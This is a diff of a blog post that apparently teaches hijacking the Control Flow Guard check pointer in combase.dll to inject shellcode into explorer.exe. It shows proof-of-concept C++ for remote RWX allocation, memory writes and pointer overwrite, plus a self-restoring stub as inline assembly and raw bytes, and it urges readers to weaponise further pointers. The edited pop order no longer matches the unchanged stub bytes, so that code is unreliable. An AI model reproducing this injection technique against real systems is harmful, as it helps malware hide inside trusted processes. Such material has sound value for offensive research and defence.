@@ -139,15 +139,15 @@ The target pointer of interest is `__guard_check_icall_fptr` as it is referenced
 Now that we have our target pointer (`combase.dll!__guard_check_icall_fptr`), we can start writing a proof of concept for this, for purposes of this post we will be weaponising it as process injection. The POC will have to perform the following:
 
 1. Locate the target pointer in memory of the current process
-2. Construct a shellcode stub to ensure clean, non-blocking execution of payload
-3. Write stub and shellcode to target process
+2. Construct a shellcode stub to ensure clean, non-blocking execution of the payload
+3. Write both stub and shellcode to target process
 4. Overwrite the pointer in the remote process
 
 ## Locating Pointers in Memory
 
 Thanks to our target binary being within `KnownDlls`, we can just locate the pointer in our own process, as it will be located at the same base address in our target process.
 
-The first step is to locate the base address of our target binary, for sake of a simple proof of concept we can simply use `LoadLibrary` to do so.
+The first step is to locate the base address of our target binary, since this is just a proof of concept, we can use `LoadLibrary` to do so.
 
 ```cpp
 HMODULE combase = LoadLibraryA("combase.dll");
@@ -171,7 +171,7 @@ For those who are less familiar with assembly, I recommend playing around with [
 In this case, we can see that `ff 15` corresponds to the type of call instruction, and `e7 c3 17 00` is the offset in little endian format.
 
 ```
-ff 15 e7 c3 17 00       call   QWORD PTR [rip+0x17c3e7]        # 0x17c3ed
+ff 15 e7 c3 17 00       call   QWORD PTR [rip+0x17c3e7]
 ```
 
 Now that we know our egg, we can define and hunt for it as follows, we will be using the EggHunt function from VX-API (thanks vx-underground <3):
@@ -232,7 +232,7 @@ Running this to test gives us the following output, confirming that we have succ
 
 ## Writing Shellcode to the Target Process
 
-Since making this specific part of process injection "stealthy" isn't the goal of this post, we will simply use the `VirtualAllocEx` and `WriteProcessMemory` WinAPIs to do so. The `0xc0` is the size of the stub rounded up to the nearest 16 bytes, which we will get into a little bit later.
+Since making this specific part of process injection "stealthy" isn't the goal of this post, we will simply use the `VirtualAllocEx` and `WriteProcessMemory` WinAPIs to do so. The `0xc0` is the size of the stub rounded up to the nearest 16 bytes to ensure that everything is aligned correctly.
 
 ```cpp
 BYTE* base_address = (BYTE*)VirtualAllocEx(process, NULL, sizeof(shellcode) + 0xc0, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -243,7 +243,7 @@ WriteProcessMemory(process, base_address, shellcode, sizeof(shellcode), NULL);
 
 For the purposes of testing, I will be using `explorer.exe`. This is because explorer is both a relatively safe process to crash (it restarts itself) and it is very heavily reliant on COM proxying, hence even right clicking will trigger our control flow hijack.
 
-As for actually writing the pointer, we will again use `VirtualProtect` and `WriteProcessMemory` to do so as follows. You may notice that `VirtualAlloc` is being used here, and that's because we are using a pointer in `.rdata` for this post, as I don't want to burn other pointers in this post. **Finding a better pointer is left to the reader.**
+As for actually writing the pointer, we will again use `WriteProcessMemory` to do so as follows. You may notice that `VirtualProtect` is being used here, and that's because we are using a pointer in `.rdata` for this post, as I don't want to burn other pointers. **Finding a better pointer is left to the reader, you can weaponise many pointers using this exact methodology.**
 
 ```cpp
 DWORD oldprotect = NULL;
@@ -253,6 +253,7 @@ success = VirtualProtectEx(process, __guard_check_icall_fptr, sizeof(FARPROC), o
 ```
 
 At this point, we can give the POC a quick test, and we have shellcode execution!
+
 ![Testing the basic POC and we see shellcode execution via calc.exe launching](/assets/img/posts/abusing-control-flow-guard-for-control-flow-hijacking/testing_poc_basic.png)
 
 There are however two issues:
@@ -274,7 +275,7 @@ To save us a lot of time, and to make use of compiler optimisations, we can actu
 ```cpp
 void stub(void)
 {
-	// save registers
+    // save registers
     asm(
         "push rax\n"
         "push rdi\n"
@@ -289,34 +290,34 @@ void stub(void)
         "push r13\n"
     );
 
-	// placeholder variables that we will replace in the loader
+    // placeholder variables that we will replace in the loader
     tVirtualProtect VirtualProtect = (tVirtualProtect)0x1111111111111111;
     tCreateThread CreateThread = (tCreateThread)0x2222222222222222;
     FARPROC* icall_fptr = (FARPROC*)0x3333333333333333;
     FARPROC icall_fptr_orig = (FARPROC)0x4444444444444444;
     DWORD oldprot = 0;
 
-	// restore original pointer value
+    // restore original pointer value
     VirtualProtect(icall_fptr, sizeof(FARPROC), PAGE_READWRITE, &oldprot);
     *icall_fptr = icall_fptr_orig;
     VirtualProtect(icall_fptr, sizeof(FARPROC), oldprot, &oldprot);
 
-	// create thread starting at shellcode address
+    // create thread starting at shellcode address
     CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)0x5555555555555555, NULL, NULL, NULL);
 
-	// restore register values
+    // restore register values
     asm(
-        "pop rax\n"
+        "pop r13\n"
+        "pop r12\n"
+        "pop r11\n"
+        "pop r10\n"
+        "pop r9\n"
+        "pop r8\n"
+        "pop rsi\n"
         "pop rdi\n"
         "pop rcx\n"
         "pop rdi\n"
-        "pop rsi\n"
-        "pop r8\n"
-        "pop r9\n"
-        "pop r10\n"
-        "pop r11\n"
-        "pop r12\n"
-        "pop r13\n"
+        "pop rax\n"
     );
 
 	// return 0, as that's what the original function did.
@@ -329,7 +330,7 @@ void stub(void)
 x86_64-w64-mingw32-gcc -fPIC -masm=intel ./stub.c -o stub.exe
 ```
 
-We can then extract the `stub` function from the executable using a disassembler, for this I used Binary Ninja's `bv.read` api, allowing us to read raw bytes from an address range.
+We can then extract the `stub` function from the executable using a disassembler, for this I used Binary Ninja's `bv.read` API, allowing us to read raw bytes from an address range.
 
 ```python
 bv.read(0x140001530, 0x1400015e6  - 0x140001530 + 1).hex()
@@ -341,10 +342,10 @@ Now that we have this, we can replace the placeholder values and then write it b
 
 ```cpp
 BYTE stub[] = {
-	0x41,0x54,0x53,0x48,0x83,0xec,0x58,0x50,0x57,0x51,0x57,0x56,0x41,0x50,0x41,0x51,0x41,0x52,0x41,0x53,0x41,0x54,0x41,0x55,0x4c,0x8d,0x4c,0x24,0x4c,0xc7,0x44,0x24,0x4c,0x00,0x00,0x00,0x00,0xba,0x08,0x00,0x00,0x00,
-	0x49,0xbc,
-	0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,
-	0x4c,0x89,0x4c,0x24,0x38,0x4c,0x89,0xe1,0x41,0xb8,0x04,0x00,0x00,0x00,0x48,0xbb,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0xff,0xd3,0x4c,0x8b,0x4c,0x24,0x38,0x44,0x8b,0x44,0x24,0x4c,0x4c,0x89,0xe1,0x48,0xb8,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0xba,0x08,0x00,0x00,0x00,0x49,0x89,0x04,0x24,0xff,0xd3,0xc7,0x44,0x24,0x20,0x00,0x00,0x00,0x00,0x45,0x31,0xc9,0x31,0xd2,0x48,0xc7,0x44,0x24,0x28,0x00,0x00,0x00,0x00,0x31,0xc9,0x49,0xb8,0x55,0x55,0x55,0x55,0x55,0x55,0x55,0x55,0x48,0xb8,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0xff,0xd0,0x58,0x5f,0x59,0x5f,0x5e,0x41,0x58,0x41,0x59,0x41,0x5a,0x41,0x5b,0x41,0x5c,0x41,0x5d,0x48,0x83,0xc4,0x58,0x5b,0x41,0x5c,0xc3
+    0x41,0x54,0x53,0x48,0x83,0xec,0x58,0x50,0x57,0x51,0x57,0x56,0x41,0x50,0x41,0x51,0x41,0x52,0x41,0x53,0x41,0x54,0x41,0x55,0x4c,0x8d,0x4c,0x24,0x4c,0xc7,0x44,0x24,0x4c,0x00,0x00,0x00,0x00,0xba,0x08,0x00,0x00,0x00,
+    0x49,0xbc,
+    0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,
+    0x4c,0x89,0x4c,0x24,0x38,0x4c,0x89,0xe1,0x41,0xb8,0x04,0x00,0x00,0x00,0x48,0xbb,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0xff,0xd3,0x4c,0x8b,0x4c,0x24,0x38,0x44,0x8b,0x44,0x24,0x4c,0x4c,0x89,0xe1,0x48,0xb8,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0xba,0x08,0x00,0x00,0x00,0x49,0x89,0x04,0x24,0xff,0xd3,0xc7,0x44,0x24,0x20,0x00,0x00,0x00,0x00,0x45,0x31,0xc9,0x31,0xd2,0x48,0xc7,0x44,0x24,0x28,0x00,0x00,0x00,0x00,0x31,0xc9,0x49,0xb8,0x55,0x55,0x55,0x55,0x55,0x55,0x55,0x55,0x48,0xb8,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0xff,0xd0,0x58,0x5f,0x59,0x5f,0x5e,0x41,0x58,0x41,0x59,0x41,0x5a,0x41,0x5b,0x41,0x5c,0x41,0x5d,0x48,0x83,0xc4,0x58,0x5b,0x41,0x5c,0xc3
 };
 HMODULE kernel32 = GetModuleHandleA("KERNEL32.DLL");
 FARPROC _VirtualProtect = GetProcAddress(kernel32, "VirtualProtect");
@@ -477,7 +478,6 @@ VOID poc(INT pid)
 
     //
     // Allocate & write shellcode to target process.
-    // TODO: add CFG hook stub here (self-restoring)
     //
     BYTE* base_address = (BYTE*)VirtualAllocEx(process, NULL, sizeof(shellcode) + 0xc0, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
